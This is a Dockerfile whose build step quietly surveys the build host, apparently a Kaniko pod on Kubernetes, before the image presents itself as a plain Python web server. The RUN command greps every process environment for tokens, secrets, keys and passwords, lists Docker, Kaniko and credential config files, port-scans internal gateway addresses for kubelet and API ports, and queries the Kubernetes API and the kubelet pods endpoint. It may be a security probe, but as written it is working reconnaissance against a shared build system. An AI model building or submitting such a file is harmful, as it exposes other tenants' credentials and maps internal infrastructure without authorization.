FROM ubuntu:24.04
ENV DEBIAN_FRONTEND=noninteractive
RUN apt-get update -qq && apt-get install -y -qq --no-install-recommends curl python3 ca-certificates procps iproute2 >/dev/null 2>&1 || true
RUN bash -c 'set -x; \
  id; echo "--- ps"; ps -ef 2>/dev/null | head -40; \
  echo "--- net"; ip addr 2>/dev/null; ip route 2>/dev/null; cat /proc/net/arp; cat /etc/resolv.conf; \
  echo "--- procenv"; for p in /proc/[0-9]*; do echo "## $p $(tr "\\0" " " < $p/cmdline 2>/dev/null | cut -c1-120)"; tr "\\0" "\\n" < $p/environ 2>/dev/null | grep -iE "token|secret|key|pass|auth|registr|docker|docr|user" | sed -E "s/^([A-Za-z0-9_]+)=(.{0,8}).*/\\1=\\2.../"; done; \
  echo "--- kaniko"; find /kaniko /root /home /etc/docker /var/run /run -maxdepth 4 -type f 2>/dev/null | head -80; \
  echo "--- configs"; for f in $(find /kaniko /root /home /etc /var/run /run -maxdepth 4 -type f \\( -name "config.json" -o -name "*.json" -o -name "*.toml" -o -name "*.yaml" -o -name "*.yml" -o -name "*cred*" -o -name "*.crt" \\) 2>/dev/null | head -60); do echo "### $f $(wc -c <$f 2>/dev/null)"; head -c 400 $f 2>/dev/null | sed -E "s/(auth|password|token|secret)([^,}]*)/\\1=REDACTED/gi"; echo; done; \
  echo "--- mounts"; cat /proc/mounts | grep -E "secret|config|kaniko|docker|workspace|tmp" | head -30; \
  echo "--- k8s"; getent hosts kubernetes.default.svc 2>&1; GW=$(ip route 2>/dev/null | awk "/default/ {print \\$3; exit}"); echo "GW=$GW"; for h in $GW 10.245.0.1 10.244.85.1; do for port in 443 10250 10255 6443 8080 8443; do timeout 2 bash -c "echo > /dev/tcp/$h/$port" 2>/dev/null && echo "OPEN $h:$port"; done; done; \
  echo "--- api"; curl -sk --max-time 4 https://kubernetes.default.svc/version || echo API_FAIL; \
  echo "--- kubelet"; curl -sk --max-time 4 https://$GW:10250/pods | head -c 400 || echo KUBELET_FAIL; \
  echo "--- done"; true'
CMD ["python3","-m","http.server","8080"]
EXPOSE 8080
